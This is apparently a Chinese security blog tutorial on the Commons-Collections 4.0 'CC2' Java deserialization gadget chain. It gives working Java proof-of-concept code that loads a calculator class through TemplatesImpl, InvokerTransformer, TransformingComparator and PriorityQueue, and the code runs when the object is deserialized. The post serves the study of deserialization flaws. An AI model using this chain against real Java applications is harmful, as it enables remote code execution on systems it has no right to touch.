---
title: Commons-Collections篇06-CC2链
date: 2025-9-28 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 前言

CC2和CC4是几乎一样的，只有`transform()`方法不同，CC4调用`InstantiateTransformer.transform()`，CC2调用`InvokerTransform()`

## 环境搭建

- [JDK8u65](https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html)
- [openJDK 8u65](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4)
- Maven 3.6.3
- Commons-Collections 4.0
- pom.xml加载Commons-Collections 依赖

```xml
<dependency>  
 <groupId>org.apache.commons</groupId>  
 <artifactId>commons-collections4</artifactId>  
 <version>4.0</version>  
</dependency>
```

## 调用链

CC2链

![image-20250929141705194](./Commons-Collections%E7%AF%8706-CC2%E9%93%BE/image-20250929141705194.png)

CC2和CC4对比一下，就只有中间调用transform()方法的类不同

![image-20250929141728103](./Commons-Collections%E7%AF%8706-CC2%E9%93%BE/image-20250929141728103.png)

结合一下就是这样

![image-20250929142053582](./Commons-Collections%E7%AF%8706-CC2%E9%93%BE/image-20250929142053582.png)



# 代码实现

## templateslmpl动态加载字节码

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());
        templates.newTransformer();
```

`setfieldvalue`函数

```java
    public static void setfieldvalue(Object obj,String fieldName,Object value) throws Exception{
        Class clazz = obj.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
```

## InvokerTransformer.transform()调用newTransformer()

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());
                InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        invokerTransformer.transform(templates);
```

## TransformingComparator.compare()调用transform()

```java
                byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());
                InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
        transformingComparator.compare(templates,templates);
```

## PriorityQueue类调用后续链子

接下来的链子都是在`PriorityQueue`类中，只需要满足其中的条件，然后反序列化调用`readObejct`就可以

其中需要注意的点在CC4中都有讲，需要控制`heapify()`函数中的`size`满足条件进入for循环

所以需要使用`add`函数给`priorityQueue`对象添加元素，`add`函数也会调用`compare`函数，所以要注意在这之前不能满足所有需求，在add之后再将`TransformingComparator`的`Transform`参数重新赋值

```java
        byte[] code = Files.readAllBytes(Paths.get("E:\\迅雷下载\\org\\example\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setfieldvalue(templates,"_name","a");
        setfieldvalue(templates,"_bytecodes",new byte[][]{code});
        setfieldvalue(templates,"_tfactory",new TransformerFactoryImpl());
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));        
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);

        Class tscomparator = transformingComparator.getClass();
        Field transformer = tscomparator.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator,invokerTransformer);

        serialize(priorityQueue);
        unserialize("CC2.txt");
```

